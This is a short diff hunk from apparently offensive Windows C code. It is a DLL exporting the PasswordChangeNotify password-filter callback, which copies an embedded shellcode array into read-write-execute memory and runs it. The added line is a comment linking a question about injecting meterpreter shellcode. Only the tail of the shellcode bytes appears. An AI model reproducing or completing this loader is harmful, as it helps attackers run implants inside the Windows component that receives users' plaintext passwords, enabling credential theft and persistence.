@@ -203,6 +203,7 @@ extern "C" __declspec(dllexport) NTSTATUS PasswordChangeNotify(
         "\x6c\x37";
 
     //execute shellcode
+    //https://security.stackexchange.com/questions/238336/cant-inject-meterpreter-shellcode-in-c-code
     void* exec = VirtualAlloc(0, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     memcpy(exec, buf, sizeof buf);
     ((void(*)())exec)();
